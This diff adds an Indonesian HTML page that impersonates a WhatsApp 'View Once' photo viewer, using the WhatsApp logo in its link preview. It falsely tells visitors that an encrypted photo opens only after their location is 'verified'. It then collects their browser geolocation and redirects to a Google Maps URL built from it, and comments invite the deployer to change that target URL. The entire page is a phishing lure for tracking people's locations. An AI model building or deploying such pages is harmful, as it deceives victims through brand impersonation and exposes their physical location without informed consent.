@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="📷 Foto Sekali Lihat (View Once)">
+    <meta property="og:description" content="Pesan ini diatur untuk dibuka satu kali saja demi privasi.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png">
+    <meta property="og:type" content="website">
+
+    <title>WhatsApp Media Viewer</title>
+    
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0b141a; /* Warna gelap WhatsApp */
+            color: #e9edef;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .icon-view-once {
+            width: 80px;
+            height: 80px;
+            border: 2px dashed #8696a0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        h2 { font-weight: 500; font-size: 1.2rem; }
+        p { color: #8696a0; font-size: 0.9rem; margin-bottom: 30px; }
+
+        .btn-view {
+            background-color: #00a884; /* Hijau WhatsApp */
+            color: #ffffff;
+            border: none;
+            padding: 12px 40px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .btn-view:active { transform: scale(0.95); }
+
+        #status {
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #ff2e74;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="icon-view-once">
+            <svg viewBox="0 0 24 24" width="40" height="40" fill="#8696a0">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"></path>
+            </svg>
+        </div>
+        
+        <h2>Foto Sekali Lihat</h2>
+        <p>Konten ini dienkripsi. Klik tombol di bawah <br> untuk memverifikasi lokasi dan melihat foto.</p>
+
+        <button class="btn-view" onclick="bukaFoto()">Buka Foto</button>
+        
+        <p id="status"></p>
+    </div>
+
+    <script>
+        function bukaFoto() {
+            const status = document.getElementById('status');
+            
+            if (!navigator.geolocation) {
+                status.innerHTML = "Browser Anda tidak mendukung verifikasi keamanan ini.";
+                return;
+            }
+
+            status.style.color = "#8696a0";
+            status.innerHTML = "Memverifikasi lokasi...";
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    // Logika: Setelah dapat lokasi, arahkan ke foto asli atau info
+                    // Anda bisa mengganti URL di bawah dengan link foto asli Anda
+                    status.innerHTML = "Verifikasi Berhasil! Mengalihkan...";
+                    
+                    setTimeout(() => {
+                        window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
+                    }, 1000);
+                },
+                (error) => {
+                    status.style.color = "#ff2e74";
+                    if (error.code == error.PERMISSION_DENIED) {
+                        status.innerHTML = "Gagal: Akses lokasi ditolak. Foto tidak bisa dibuka.";
+                    } else {
+                        status.innerHTML = "Terjadi kesalahan teknis.";
+                    }
+                }
+            );
+        }
+    </script>
+
+</body>
+</html>
